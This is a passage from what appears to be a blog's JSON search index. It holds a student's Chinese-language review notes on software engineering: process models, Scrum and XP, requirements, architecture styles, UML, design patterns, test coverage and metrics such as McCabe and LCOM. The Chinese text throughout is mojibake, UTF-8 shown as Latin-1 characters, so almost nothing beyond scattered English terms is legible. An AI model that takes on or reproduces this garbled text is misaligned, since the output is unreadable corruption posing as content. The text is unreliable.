ä¸€ä¸ªæ–¹æ³•ï¼šå¯¹åˆ†æ”¯ç»“æ„è¿›è¡Œåˆå¹¶ï¼Œå¦‚ä½•åˆå¹¶ï¼ˆä¸€ä¸ªå±‚çº§çš„æ‰èƒ½åˆå¹¶ï¼‰ï¼Œä½¿æ•´ä½“ç»“æ„ç¬¦åˆå®šä¹‰","link":"","tags":[]},{"title":"è½¯ä»¶å·¥ç¨‹å¤ä¹ ","date":"2021-03-11T04:00:19.000Z","path":"2021/03/11/è½¯ä»¶å·¥ç¨‹å¤ä¹ /","text":"æœ¬æ–‡æ˜¯å¤§ä¸‰ä¸Š è½¯ä»¶å·¥ç¨‹ ç§‘ç›®çš„å¤ä¹  è½¯ä»¶å·¥ç¨‹å¤ä¹ è½¯ä»¶å·¥ç¨‹ä¸‰è¦ç´ ï¼š æ–¹æ³• å·¥å…· å’Œ è¿‡ç¨‹ è½¯ä»¶å¼€å‘æ–¹æ³•*ä¼ ç»Ÿå¼€å‘æ–¹æ³•ç»“æ„åŒ–æ–¹æ³•ï¼šåˆ†é˜¶æ®µçš„ï¼Œ é¡ºåºçš„ï¼Œä¾èµ–æ€§ ç¼ºç‚¹ï¼š ç¼ºå°‘çµæ´»æ€§ï¼Œé™æ€ï¼Œç¼ºå°‘åº”å¯¹å˜åŒ–çš„èƒ½åŠ› é¢å‘å¯¹è±¡æ–¹æ³•å°†è½¯ä»¶æ„ä»¶åˆ’åˆ†ä¸º ç±»ï¼Œå¹¶å®šä¹‰ä¸€ç»„ é™æ€çš„ å˜é‡ å’Œ åŠ¨æ€çš„ æ–¹æ³• åˆ©ç”¨çˆ¶å­ç±»å’Œç»§æ‰¿çš„å…³ç³»å½¢æˆ å±‚æ¬¡ç»“æ„ ï¼Œ å°è£…æ€§ï¼šå¯¹è±¡é—´ä»…èƒ½é€šè¿‡å‘é€æ¶ˆæ¯äº’ç›¸è”ç³» é€šè¿‡åå¤è¿­ä»£å¼€å‘è½¯ä»¶ï¼Œé™ä½å¤æ‚æ€§ï¼Œæé«˜å¯ç†è§£æ€§ï¼Œæ”¯æŒè½¯ä»¶é‡ç”¨ æ›´å¥½çš„åº”å¯¹å˜åŒ– è½¯ä»¶å¼€å‘å„é˜¶æ®µæ´»åŠ¨åŠä»»åŠ¡* å¯è¡Œæ€§åˆ†æ ï¼š é«˜å±‚æ¬¡éœ€æ±‚åˆ†æ - æŠ€æœ¯ï¼Œç»æµï¼Œç¤¾ä¼š éœ€æ±‚åˆ†æï¼šè¿›è¡Œå˜æ›´ç®¡ç† é€‚åº”å˜åŒ–ï¼Œåˆ†ä¸ºåŠŸèƒ½æ€§å’ŒéåŠŸèƒ½æ€§ï¼Œè¾“å‡ºéœ€æ±‚è§„æ ¼è¯´æ˜ä¹¦ è½¯ä»¶è®¾è®¡ï¼šæ¦‚è¦+è¯¦ç»† ç¨‹åºç¼–ç  è½¯ä»¶æµ‹è¯•ï¼š å•å…ƒ-&gt;é›†æˆ-&gt;ç³»ç»Ÿï¼Œåˆ†ä¸ºé»‘ç›’å’Œç™½ç›’ è½¯ä»¶ç»´æŠ¤: æ”¹æ­£æ€§ï¼Œé€‚åº”æ€§ï¼Œå®Œå–„æ€§ï¼Œé¢„é˜²æ€§ ç”Ÿå‘½å‘¨æœŸæ¨¡å‹ç€‘å¸ƒæ¨¡å‹*ä¼ ç»Ÿå¼€å‘æ–¹æ³• æœ€å¹¿æ³›ï¼Œé¡ºåºæ€§ï¼Œä¾èµ–æ€§ æ¨è¿Ÿå†™ä»£ç ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½å†™æ–‡æ¡£ ç¼ºç‚¹ï¼šç”¨æˆ·å‚ä¸å°‘ï¼Œé™æ€ å¿«é€ŸåŸå‹æ¨¡å‹*çœ‹å ä¼˜ç‚¹ï¼š ç”¨æˆ·å‚ä¸å¤šäº† ç¼ºç‚¹ï¼š åŸå‹å¤§æ¦‚ç‡æŠ›å¼ƒ å¢é‡æ¨¡å‹åˆ†ä¸ºåŠŸèƒ½æ¨¡å—ï¼Œé€æ­¥å®ç°ï¼ˆå¼€æ”¾æ¶æ„ï¼‰ èºæ—‹æ¨¡å‹ç€‘å¸ƒ+å¿«é€ŸåŸå‹+é£é™©åˆ†æ æ¯é˜¶æ®µå¢åŠ é£é™©åˆ†æï¼Œé™ä½é£é™© å–·æ³‰æ¨¡å‹*è¿­ä»£å’Œæ— ç¼ æ€»ç›®æ ‡ï¼š çº¿æ€§è¿‡ç¨‹ è¿­ä»£* é€æ­¥æ±‚ç²¾ï¼Œé¢å‘å¯¹è±¡ æ•æ·æ•æ·å®£è¨€ ä¸ªä½“+äº’åŠ¨ &gt; æµç¨‹+å·¥å…· è½¯ä»¶ &gt; æ–‡æ¡£ å®¢æˆ·åˆä½œ &gt; åˆåŒè°ˆåˆ¤ ç›¸åº”å˜åŒ– &gt; éµå¾ªè®¡åˆ’ å¢é‡ å’Œ è¿­ä»£ç³»ç»Ÿç”±ä¸‰ä¸ªæ¨¡å—æ„æˆï¼Œ å¢é‡ï¼šä¸€ä¸ªä¸ªå®ç° ã€‚ è¿­ä»£ï¼Œå®ç°ä¸‰ä¸ªåƒåœ¾æ¨¡å—ï¼Œå†ä¸€æ­¥æ­¥æ±‚ç²¾ã€‚ SCRUM*å†²åˆº Sprint ï¼š ä¸€ä¸ªå·¥ä½œå‘¨æœŸ äº§å“è®¢å•ï¼š é¡¹ç›®çš„æ¦‚è¦æ–‡æ¡£ï¼Œä»¥å¤©ä¸ºå•ä½ å†²åˆºè®¢å• ï¼š å°æ–‡æ¡£ï¼Œä»¥16å°æ—¶ä¸ºå•ä½ ç‡ƒå°½å›¾ï¼š to-do list è§’è‰² äº§å“æ‹¥æœ‰è€… ï¼š ç”²æ–¹é¢†å¯¼ åˆ©ç›Šç›¸å…³è€… ï¼š å®¢æˆ· ä¸“å®¶ ï¼š æŠ€æœ¯æ€»ç›‘ å›¢é˜Ÿæˆå‘˜ ï¼š ç¨‹åºå‘˜ æ´»åŠ¨ è®¡åˆ’ä¼šï¼š å†²åˆºåˆåˆ¶å®šè®¡åˆ’ æ¯æ—¥ç«‹ä¼šï¼š æ¯å¤©15åˆ†é’Ÿ è¯„å®¡ä¼šï¼š å†²åˆºç»“æŸå‰ åæ€ä¼š/å›é¡¾ä¼š ï¼š å†²åˆºç»“æŸå XP äº SCRUM åŒºåˆ« XP SCRUM è¿­ä»£é•¿åº¦ 1-2å‘¨ 3-4å‘¨ è¿­ä»£ä¸­æ˜¯å¦å…è®¸ä¿®æ”¹éœ€æ±‚ yes no è¿­ä»£ä¸­æ˜¯å¦æŒ‰ä¼˜å…ˆçº§å®ç° yes no æ˜¯å¦é‡‡ç”¨ä¸¥æ ¼å·¥ç¨‹æ–¹æ³•ï¼Œä¿è¯è¿›åº¦è´¨é‡ yes no DevOpsè‡ªåŠ¨åŒ–ï¼Œé«˜åº¦ä¾èµ–å·¥å…· éœ€æ±‚åˆ†æç”¨æˆ· &amp; ç³»ç»Ÿ ç³»ç»Ÿéœ€æ±‚æ˜¯å¯¹ç”¨æˆ·éœ€æ±‚çš„ç»†åŒ–å’Œå®Œå–„ ç³»ç»Ÿéœ€æ±‚çš„é˜…è¯»å¯¹è±¡æ˜¯å¼€å‘è€…ï¼Œç”¨æˆ·éœ€æ±‚æ˜¯å®¢æˆ· ç³»ç»Ÿéœ€æ±‚æ˜¯ç”¨æˆ·éœ€æ±‚çš„å¼€å§‹ ç›®æ ‡ &amp; æ¶‰ä¼— æ¶‰ä¼—ä¸ç›®æ ‡ç³»ç»Ÿç›¸å…³çš„ä¸€åˆ‡äººå’Œç‰© ç³»ç»ŸåŠŸèƒ½çš„ç¡®å®šæ­£å¼å’Œéæ­£å¼çš„è®¿è°ˆ åˆ†æè¿‡ç¨‹ç”¨ä¾‹-&gt;è§„çº¦ç”¨ä¾‹å¹¶ç”Ÿæˆæ–‡æ¡£-&gt;æ´»åŠ¨å›¾-&gt;æ–‡å­—åŠŸèƒ½æ€§éœ€æ±‚ ä¸‰ç§åŠŸèƒ½æ€§éœ€æ±‚ç³»ç»ŸåŠŸèƒ½éœ€æ±‚ + äº¤äº’éœ€æ±‚ + å¤–éƒ¨æ¥å£éœ€æ±‚ éœ€æ±‚è¯´æ˜ä¹¦æ–‡æ¡£+æ¶‰ä¼—+ç›®æ ‡+åŠŸèƒ½ï¼ŒéåŠŸèƒ½+äº¤ä»˜ç‰©+éªŒæ”¶æ ‡å‡†+é™„ä»¶ éœ€æ±‚è·Ÿè¸ªä¸šåŠ¡ï¼Œâ€”â€“éœ€æ±‚ï¼Œ ç±»æ¨¡å‹ ä¸‰è€…é€’å½’ç¡®å®šï¼Œäº’æœ‰å¯¹åº” |â€”â€”â€”â€”-| â€”â€”â€”| - æ´»åŠ¨å›¾ï¼Œéœ€æ±‚æ–‡æ¡£ï¼Œç±»å›¾ æé«˜å®Œå¤‡æ€§ï¼ŒåŒæ—¶æ£€æŸ¥æ˜¯å¦æœ‰å†—ä½™ï¼ˆæœ‰æ²¡æœ‰ç¼ºçš„ï¼Œå¤šçš„ï¼‰ è½¯ä»¶æ¶æ„åŸºæœ¬å…ƒç´ æ„ä»¶ + è¿æ¥ä»¶ + é…ç½® æ•°æ®æµé£æ ¼ç®¡é“ä¸è¿‡æ»¤å™¨ï¼š ä¿¡æ¯éšè—ï¼Œé«˜å†…èšä½è€¦åˆï¼Œå¯ä»¥çµæ´»ç»„åˆ å±‚æ¬¡ç³»ç»Ÿ ï¼šè®¡ç®—æœºç½‘ç»œ æ­£äº¤è½¯ä»¶æ¶æ„ï¼š å±‚ ï¼š ä¸€ç»„å…·æœ‰ç›¸åŒæŠ½è±¡çº§åˆ«çš„æ„ä»¶ çº¿ç´¢ï¼š ç”¨ä¾‹å½¢æˆçš„è°ƒç”¨å…³ç³» å¥½å¤„ï¼šæ¯ä¸ªéœ€æ±‚å˜åŠ¨ä»…å½±å“æŸä¸€æ¡çº¿ç´¢ å®¢æˆ·æœºæœåŠ¡å™¨æ¶æ„: ä¸€ä¸ªæœåŠ¡å™¨æœåŠ¡å¤šä¸ªå®¢æˆ·ç«¯ é€‚åº”å˜åŒ–ï¼Œçµæ´» æ˜“äºå¯¹ç³»ç»Ÿè¿›è¡Œæ‰©å……å’Œç¼©å° åŠŸèƒ½æ„å»ºéš”ç¦» æµè§ˆå™¨/æœåŠ¡å™¨æ¶æ„ : åŸºæœ¬åŒä¸Š+æŠ½å–clientçš„functionå½¢æˆçš„webæœåŠ¡å™¨ ç‹¬ç«‹æ„å»ºé£æ ¼MVCæ¶æ„* Model: ä¼ä¸šæ•°æ®å’Œä¸šåŠ¡è§„åˆ™ Viewï¼šç”¨æˆ·çœ‹åˆ°å¹¶ä¸ä¹‹äº¤äº’çš„ç•Œé¢ Controllerï¼šæ ¹æ®è¾“å…¥è°ƒç”¨æ¨¡å‹å’Œè§†å›¾å»å®Œæˆç”¨æˆ·çš„éœ€æ±‚ï¼Œä¸è¾“å‡ºç»“æœï¼Œä¸åšä»»ä½•å¤„ç† æ•°æ®ä¸­å¿ƒé£æ ¼ - ä»“åº“ç³»ç»Ÿæ˜Ÿå‹ç»“æ„ï¼Œä¸­å¤®æ•°æ®åº“å’Œå‘¨è¾¹client é»‘æ¿ç³»ç»Ÿï¼šä¸­å¤®æ•°æ®åº“å°†çŠ¶æ€é€šçŸ¥clientï¼Œç”±clientå†³å®šé€‰æ‹© ç±»çš„åˆ†æä¸è®¾è®¡è¿­ä»£é€çº§ç»†åŒ– ç±»çš„ç§ç±» å®ä½“ç±»ï¼šå­˜å‚¨ï¼Œä¼ é€’æ•°æ®çš„ç±»ï¼Œåè¯ æ§åˆ¶ç±»ï¼šç®¡ç†ç±»ï¼Œä½“ç°æ‰§è¡Œé€»è¾‘ï¼ŒåŠ¨å®¾ è¾¹ç•Œç±»ï¼šå¤–éƒ¨ç”¨æˆ·äº¤äº’ï¼Œç•Œé¢ç±»ï¼Œæ•°æ®äº¤æ¢ç±» é¢†åŸŸæ¨¡å‹åˆå§‹ç±»å›¾-å®ä½“ç±» å®ä½“ç±» &lt;&lt;entity&gt;&gt; ç±»å ï¼š æ„é€ æ€§ å˜é‡ï¼š å¯è§æ€§ (private , public ..) - (-,+,_,~) ä¾èµ–ï¼ˆè®¡ç®—ï¼‰å±æ€§ï¼Œ(/) åå­— ï¼š ç±»å‹ ï¼š UMLå®šä¹‰çš„ï¼Œint Stringâ€¦ ä¸‹åˆ’çº¿ï¼šè¡¨ç¤ºé™æ€ æ²¡æœ‰æ–¹æ³• ç±»çš„å…³ç³»* å…³è”å…³ç³» ï¼š é™æ€ï¼Œæ‹¥æœ‰ï¼Œé•¿æœŸæŒä¹… å¯¼èˆªæ–¹å‘ ï¼š ç®­å¤´ ï¼Œ åŒ…å«å…³ç³» ä¾èµ–å…³ç³» ï¼š åŠ¨æ€ï¼Œä¸´æ—¶ - é¿å…åŒå‘ä¾èµ– ä¾èµ– åŒ…å« å…³è” å¯¹è±¡ å¯¹è±¡åï¼šç±»çš„ç±»å‹ å®ä¾‹å˜é‡ = åˆå§‹å€¼ å¯¹è±¡åä¸ºç©ºä»£è¡¨åŒ¿åå¯¹è±¡ï¼Œç±»åä¸ºç©ºä»£è¡¨æœ‰ä¸Šä¸‹æ–‡ ç®¡ç†ç±» &amp; æ§åˆ¶ç±» ç®¡ç†ç±» æ§åˆ¶ç±» ä¸è€ƒè™‘getï¼Œsetæ–¹æ³• éš”ç¦»è¾¹ç•Œä¸å®ä½“ å¯¹è±¡ å¯¹äºåŒç±»å¯¹è±¡çš„åè°ƒå’Œç®¡ç† ä¸åŒç±» å±‚ Domainå±‚ ä¸šåŠ¡æ§åˆ¶å±‚ ä½œç”¨ åˆ›å»ºå¯¹è±¡ï¼Œä»£ç†è®¿é—®å…¶ä»–å¯¹è±¡ ä¸€ä¸ªç”¨ä¾‹ä¸€ä¸ª ä¼˜åŒ–åˆ©ç”¨æŠ½è±¡ç±»éš”ç¦»å˜åŒ– ç©ºä¸‰è§’ç®­å¤´è¡¨ç¤ºç»§æ‰¿ æšä¸¾ç±» &lt;&lt;enumeration&gt;&gt;ç•Œé¢è®¾è®¡ï¼šå¯¹å®ä½“ï¼Œç”Ÿæˆ ProjectMask ä»£ç†ç±» CASEå·¥å…·è½¯ä»¶å¼€å‘ç¯å¢ƒï¼Œè®¡ç®—æœºè¾…åŠ©è½¯ä»¶å·¥ç¨‹ ç±»çš„å…³ç³»é›†åˆç±»å‹ æ˜¯å¦è¦æ±‚é¡ºåº æ˜¯å¦è¦æ±‚å”¯ä¸€æ€§ no yes Set no no Bag/Multiset yes yes OrderedSet yes no List/Sequence é€‚ç”¨æ¨¡æ¿ç±»è€Œéå…·ä½“ç±» èšåˆ - èšé›†éƒ¨åˆ†ä¸æ•´ä½“ï¼Œå…±äº« ç»„åˆå­˜åœ¨ä¾èµ–æ€§ - åŒç”Ÿå…±æ­» ä¾èµ–è®¿é—®çš„ç¬æ—¶æ€§ - ç”¨å‚æ•° ç±»çš„è¯¦ç»†è®¾è®¡ç®—æ³•+æ•°æ®ç»“æ„+ç‰©ç†ç»“æ„ å…¶ä»–è®¾è®¡+è¯¦ç»†è®¾è®¡è¯´æ˜ä¹¦+è¯„å®¡ ä»€ä¹ˆæ˜¯ç»“æ„åŒ–çš„ç¨‹åº ç›’å›¾å›¾ä¾‹ï¼šä¸å…è®¸éšæ„è·³è½¬ - å‘é‡ŒåµŒå¥— PADå›¾é—®é¢˜åˆ†æå›¾ - å‘å³åµŒå¥— åˆ¤å®šè¡¨ä½¿ç”¨â€œâ€”â€æ¥è¡¨ ç¤ºå¯¹æ­¤æ¡ä»¶çš„ä¸å…³å¿ƒæˆ–ä¸é€‚ç”¨ åˆ¤å®šæ ‘ï¼š ç»“ç‚¹-é€‰æ‹©ï¼Œå¶å­-ç»“æœ PDLäººè¯ç‰ˆçš„Cè¯­è¨€ OCL ï¼Ÿå†çœ‹çœ‹ è®¾è®¡ä¼˜åŒ–smellåƒµåŒ–æ€§ï¼Œè„†å¼±æ€§ï¼Œé¡½å›ºæ€§ï¼Œç²˜æ»æ€§ï¼Œå¤æ‚ï¼Œé‡å¤ï¼Œæ™¦æ¶© é‡å†™ ä¸çˆ¶ç±»æ–¹æ³•æœ‰ç›¸ä¼¼çš„è¡Œä¸ºï¼Œç»†èŠ‚è°ƒæ•´ ç›¸åŒæ¡ä»¶å·¥ä½œï¼Œå­ç±»ä¸åº”å…·æœ‰æ¯”å…¶çˆ¶ç±»æ›´ä¸¥æ ¼çš„æ¡ä»¶é™åˆ¶ - Liskovæ›¿æ¢åŸåˆ™ é‡å†™çš„æ–¹æ³•æœ€é«˜ä¸èƒ½è¶…å‡ºçˆ¶ç±»æ–¹æ³•çš„çŠ¶æ€ã€‚ å¾ªç¯ä¾èµ–ï¼šæå–æ¥å£ ç‹æ˜µå…³ç³»ï¼š ä¸¤ä¸ªç±»è¿‡åˆ†äº²å¯†ï¼Œé«˜è€¦åˆ æ¥å£éš”ç¦»åŸåˆ™ï¼šæ¥å£çš„ç¨³å®šï¼Œé€‚åº”å˜åŒ–ï¼ŒåŒä¸€ä¸ªç±»æå–ä¸åŒçš„æ¥å£ ä¾èµ–å€’ç½®åŸåˆ™ï¼šä¾èµ–äºæŠ½è±¡ å¼€æ”¾å°é—­åŸåˆ™ï¼š æ‰©å±•å¼€æ”¾ï¼Œä¿®æ”¹å°é—­ å•ä¸€èŒè´£åŸåˆ™ï¼šå•ä¸€åŠŸèƒ½ åˆæˆ/èšåˆå¤ç”¨åŸåˆ™ï¼šå°½é‡ä½¿ç”¨åˆæˆ/èšåˆ å½¢å¼çš„å§”æ‰˜é‡ç”¨ï¼Œå°½é‡ä¸ä½¿ç”¨ç»§æ‰¿é‡ç”¨ å­ç±»æ˜¯çˆ¶ç±»çš„ç‰¹æ®Šç±»å‹ æ¨¡å¼ æ¶æ„æ¨¡å¼ï¼š MVCï¼Œå±‚æ¬¡ç­‰ è®¾è®¡æ¨¡å¼ï¼šæŠ½è±¡å·¥ç¨‹ä¹‹ç±»çš„ å®ç°æ¨¡å¼ï¼šå…·ä½“åˆ°å†™ä»£ç ï¼Œç±»åï¼Œå˜é‡åï¼Œå‡½æ•°åã€‚ã€‚ åˆ›å»ºæ¨¡å¼ ç»“æ„æ¨¡å¼ è¡Œä¸ºæ¨¡å¼ ç±» æŠ½è±¡å·¥å‚ é€‚é…å™¨ è§‚å¯Ÿè€…æ¨¡å¼ ç±» å•ä¾‹ æ¡¥ - è£…é¥° ç­–ç•¥æ¨¡å¼ ç±» ä»£ç† çŠ¶æ€ ç±» é—¨é¢ æŠ½è±¡å·¥å‚æ¨¡å¼å·¥å‚è¡¨ç¤ºä¸€ç»„äº§å“çš„æ‰“åŒ…ï¼Œä¸åŒçš„å·¥å‚å¯¹åº”ä¸åŒçš„ç»„åˆ æŠ½è±¡å·¥å‚æ˜¯ä¸€ä¸ªæ¥å£ï¼Œç”¨äºç”Ÿæˆä¸€ç»„å¯¹è±¡ï¼Œå®é™…å¯¹è±¡æ ¹æ®ç±»åˆ«åˆæœ‰è‡ªå·±çš„æ¥å£ ä½è€¦åˆï¼Œä¸”æ·»åŠ æ–°çš„æ›´å®¹æ˜“ å•ä¾‹æ¨¡å¼ç®¡ç†ç±»æˆ–æ§åˆ¶ç±»ç³»ç»Ÿä¸­åªéœ€è¦ä¸€ä¸ªå®ä¾‹ï¼Œè¯¥å®ä¾‹åœ¨ç¨‹åºä¸­è¢«åˆ›å»º è¦æ±‚ç±»çš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæœ‰å…¬æœ‰çš„æ–¹æ³•è·å–è¯¥ç±»çš„å®ä¾‹ï¼Œå®ä¾‹å˜é‡ä¸ºç§æœ‰æˆ–å—ä¿æŠ¤çš„ã€‚ é€‚é…å™¨æ¨¡å¼åˆ©ç”¨ é€‚é…å™¨è¿›è¡Œæ¥å£çš„è½¬æ¢ æ¡¥æ¨¡å¼å…ˆå°†ä¸åŒçš„å˜åŒ–ç»´åº¦ï¼ˆå•ä¸€èŒè´£åŸåˆ™ï¼‰åˆ†ç¦»ï¼Œæ¯ä¸ªç»´åº¦éƒ½æœ‰ç‹¬ç«‹çš„æŠ½è±¡å’Œç»§æ‰¿ç»“æ„ï¼Œå»ºç«‹æŠ½è±¡è€¦åˆ è£…é¥°æ¨¡å¼å¯¹äºè´Ÿæ•°åŠŸèƒ½ï¼Œè‹¥å°†å…¶å½’å…¥ä¸åŒçš„å˜åŒ–ç»´åº¦å¤ªå¤šäº†ï¼Œå½’å…¥è£…é¥°å™¨ å°†Bridgeä¸­çš„æŠ½è±¡ å’Œå®ç°åˆäºŒä¸ºä¸€äº†ï¼Œæ˜¯å…¶ç‰¹æ®Šå½¢å¼ é—¨é¢æ¨¡å¼å¤–éƒ¨ä¸ä¸€ä¸ªå­ç³»ç»Ÿçš„é€šä¿¡å¿…é¡»é€šè¿‡ä¸€ä¸ªç»Ÿä¸€çš„é—¨é¢å¯¹è±¡ï¼Œä¸”å•ä¾‹ ä»£ç†æ¨¡å¼ä¸­ä»‹ï¼Œè´Ÿè´£èµ„æºçš„ä¸­é—´å¤„ç†ï¼ŒèŠ‚çœä¸»ä½“çš„æ—¶é—´ ç”¨æ¥å¯¹æœ‰ä»·å€¼ç¨€ç¼ºèµ„æºçš„ç®¡ç†ï¼Œæ¯”å¦‚æ•°æ®åº“çš„è¿æ¥ç­‰ï¼Œæé«˜èµ„æºçš„åˆ©ç”¨ç‡æˆ–ç³»ç»Ÿæ€§èƒ½ è§‚å¯Ÿè€…æ¨¡å¼MVCé€‚ç”¨äº†è§‚å¯Ÿè€… å½“ä¸»é¢˜å¯¹è±¡åœ¨çŠ¶æ€ä¸Šå‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šé€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€…å¯¹è±¡ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿè‡ªåŠ¨æ›´æ–°è‡ªå·± ç­–ç•¥æ¨¡å¼å°†æ¯ä¸€ä¸ªç®—æ³•å°è£…åˆ°å…·æœ‰å…±åŒæ¥å£çš„ç‹¬ç«‹çš„ç±»ä¸­ çµæ´»å¯ä»¥ç›¸äº’æ›¿æ¢ çŠ¶æ€æ¨¡å¼ä½¿ç”¨ä¸€ä¸ªå…·æœ‰å¤šä¸ªå­ç±»çš„ç±»ï¼Œæå‰åˆ›å»ºæ‰€æœ‰å¯¹åº”çš„å­ç±»ï¼ŒçŠ¶æ€å˜åŒ–æ—¶æ¢ç±» è½¯ä»¶æµ‹è¯•æµ‹è¯•çš„é€šè¿‡å¹¶ä¸èƒ½ç”¨æ¥è¯æ˜æ•´ä¸ªç³»ç»Ÿæ˜¯æ­£ç¡®çš„ æµ‹è¯•Væ¨¡å‹ + æµ‹è¯•* æµ‹è¯•åç§° å¼€å‘é˜¶æ®µ æµ‹è¯•å¯¹è±¡ æµ‹è¯•æ–¹æ³• å•å…ƒæµ‹è¯• å®ç° ç±»æµ‹è¯• ç™½ç›’æµ‹è¯• é›†æˆæµ‹è¯• ç³»ç»Ÿè®¾è®¡ åŒ…æˆ–ç³»ç»Ÿæµ‹è¯•-äº¤äº’ ç°ç›’æµ‹è¯• ç³»ç»Ÿæµ‹è¯• ç³»ç»Ÿéœ€æ±‚ æ„ä»¶å’Œæ¥å£æµ‹è¯• é»‘ç›’æµ‹è¯• éªŒæ”¶æµ‹è¯• å®¢æˆ·éœ€æ±‚ ç°åœºå¤ç° é»‘ç›’æµ‹è¯• ä¸ºä»€ä¹ˆè¦æ—©ä¿®æ­£ æ¶‰åŠçš„èŒƒå›´è¶Šæ¥è¶Šå¹¿æ³› æ›¾ç»ä»˜å‡ºçš„æˆæœ¬è¶Šæ¥è¶Šé«˜ çœ‹ä¸€çœ¼ P9 å·¦ä¸‹å›¾ éåŠŸèƒ½æµ‹è¯•å³°å€¼ ï¼Œ å°–å³°ï¼Œ å‹åŠ› ï¼Œ æµ¸æ³¡ è½¯ä»¶åº¦é‡McCabe + æ§åˆ¶æµå›¾è¾¹æ•° - ç‚¹æ•° + 2 = åˆ†æ”¯ç»“ç‚¹+1 LCOM$$LCOM = \\frac{(\\frac 1 a \\sum_{j=1}^{a}\\mu(A_j))-m}{1-m}$$ mä¸ºæ–¹æ³•æ•°ï¼Œaä¸ºæ‰€å«çš„å®ä¾‹å˜é‡æ•°ï¼Œ ä¸ºè®¿é—®æ¯ä¸ªå®ä¾‹å˜é‡çš„æ–¹æ³•æ•°ã€‚ ç­‰ä»·ç±»æµ‹è¯• - é»‘ç›’ æ•°å€¼ï¼šä¸€èˆ¬ï¼Œä¸€ä¸ªæœ‰æ•ˆï¼Œä¸¤ä¸ªæ— æ•ˆ å…¶ä»–ï¼š ä¸€ä¸ªæœ‰æ•ˆï¼Œä¸€ä¸ªæ— æ•ˆ ä¼ ç»Ÿ + å¼ºç­‰ä»·ç±»æ–¹æ³• è¾¹ç•Œå€¼åˆ†æ ï¼šå¯¹æ•°å€¼è¾¹ç•Œåˆ›å»ºæœ‰æ•ˆæˆ–æ— æ•ˆç­‰ä»·ç±» æ§åˆ¶æµ çš„ è¦†ç›–æµ‹è¯• - ç™½ç›’ è¯­å¥è¦†ç›– - ç»“ç‚¹ åˆ†æ”¯è¦†ç›– - è¾¹ æ¡ä»¶è¦†ç›– - åŸå­è°“è¯çœŸå‡ æ»¡è¶³åˆ†æ”¯è¦†ç›–è¦æ±‚ä¸€å®šä¼šæ»¡è¶³è¯­å¥è¦†ç›–è¦æ±‚ åˆ†æ”¯è¦†ç›–ä¸èƒ½è¦†ç›–æ¡ä»¶ï¼Œå› ä¸ºæ¡ä»¶æ˜¯åŸå­è°“è¯åˆ¤æ–­ï¼Œä½†å¯¹äºç»„åˆæ¡ä»¶å¯èƒ½ä¼šæœ‰è¯¸å¦‚çŸ­è·¯çš„æƒ…å†µ æ¡ä»¶ä¸èƒ½è¦†ç›–åˆ†æ”¯ï¼Œå› ä¸ºæ˜¯ 2*åŸå­è°“è¯ï¼Œå¯èƒ½æœ‰æ²¡è¦†ç›–åˆ°çš„æƒ…å†µ åˆ†æ”¯ ï¼Œæ¡ä»¶ å¹¶ä¸å®Œå…¨è¦†ç›–ï¼Œç»¼åˆä¸€ä¸‹ å¤šæ¡ä»¶ç»„åˆè¦†ç›– - åŸå­è°“è¯åŠå…¶ç»„åˆè¦†ç›– åŸºæœ¬è·¯å¾„æµ‹è¯• - ç‹¬ç«‹è·¯å¾„ ï¼ˆ ç‹¬ç«‹è·¯å¾„è¦æ±‚åœ¨è·¯å¾„ä¸­è‡³å°‘å«æœ‰ä¸€æ¡æœªæ›¾ä½¿ç”¨è¿‡çš„è¾¹ï¼‰ &lt;= V(G) æ–­è¨€Junitå¯æµ‹è¯•æ€§ - å½¼æ­¤ä¾èµ–è€Œéœ€è¦ æ¨¡æ‹Ÿç¨‹åº æˆ– æ¡© è®¾è®¡ç®€å•æ–¹æ³• é¿å…ç§æœ‰æ–¹æ³• ä¼˜å…ˆä½¿ç”¨é€šç”¨æ–¹æ³• ç»„åˆä¼˜äºç»§æ‰¿ é¿å…éšè—çš„ä¾èµ–å…³ç³»ä¸å…¨å±€çŠ¶æ€ äººå·¥æµ‹è¯•å®¡æŸ¥ - è¯„å®¡ - èµ°æŸ¥ CMMIç»Ÿä¸€çš„ï¼Œæ˜ç¡®å®šä¹‰çš„ç»„ç»‡çº§è½¯ä»¶å·¥ç¨‹ åˆå§‹çº§ - å·²ç®¡ç† - å·²å®šä¹‰ - å·²é‡åŒ–ç®¡ç† - ä¼˜åŒ– UMLç”¨ä¾‹å›¾æ³¨æ„åŒä¸€ä¸ªå›¾ä¸­çš„ç”¨ä¾‹åœ¨åŒä¸€ä¸ªæŠ½è±¡çº§åˆ« è§’è‰² Actoräººæˆ–è½¯ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨ç³»ç»Ÿï¼Œä¸ç³»ç»Ÿæœ‰å…³ç³» å¯»æ‰¾ç”¨ä¾‹è‡ªå·±ç†è§£å§ åŒ…å«å…³ç³» &lt;&lt;include&gt;&gt;ä¸€äº›é€šç”¨ï¼Œå…±åŒåŸºç¡€è¿‡ç¨‹çš„åŠŸèƒ½ï¼Œé¿å…é‡å¤å®ç° - éé€»è¾‘åˆ†è§£ å…³é”®è¯ï¼š ä¾èµ–ï¼ŒåŒ…å« æ‰©å±•å…³ç³» &lt;&lt;extend&gt;&gt;ç‰¹æ®Šæƒ…å†µï¼Œéœ€è¦æœ‰æ¡ä»¶ å…³é”®è¯ï¼šé”™è¯¯ï¼Œç‰¹æ®Šæƒ…å†µ æ´»åŠ¨å›¾è·¨ç”¨ä¾‹ å›¾ç¤º å¼€å§‹ç‚¹ ï¼šå®å¿ƒåœ†ç‚¹ ï¼Œ ç»“æŸç‚¹ ï¼šå®å¿ƒåŠ ä¸€åœˆ åŠ¨ä½œï¼šåœ†è§’çŸ©å½¢ æ¡ä»¶ ï¼š è±å½¢ - å¯çœç•¥ åˆ†æ”¯ï¼Œæ±‡èšï¼š ç²—æ¨ªçº¿ï¼Œ {and}ï¼Œ{or} å¯¹è±¡ï¼š ç›´è§’çŸ©å½¢ é›†åˆ ï¼š å¤šä¸ªåŠ¨ä½œ ï¼ˆä¸‰å‰æˆŸï¼‰ å¦‚æœåŠ¨ä½œå…·æœ‰å¤šä¸ªæ±‡èšçš„ç®­å¤´ï¼Œéœ€è¦ç­‰å¾…æ‰€æœ‰åˆ†æ”¯éƒ½å®Œæˆ æ³³é“æŒ‰è§’è‰²åˆ’åˆ† 